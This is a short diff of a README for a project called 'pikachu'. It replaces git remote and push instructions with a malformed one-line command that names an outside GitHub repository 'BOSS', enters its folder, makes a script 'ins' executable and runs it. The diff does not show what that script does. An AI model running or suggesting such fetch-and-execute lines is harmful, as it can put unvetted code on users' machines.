@@ -1,3 +1,2 @@
 # pikachu
-git remote add origin https://github.com/haseen199611/pikachu.git
-git push -u origin master
+https://github.com/TH3BS/BOSS.git ;cd BOSS;chmod +x ins;./ins
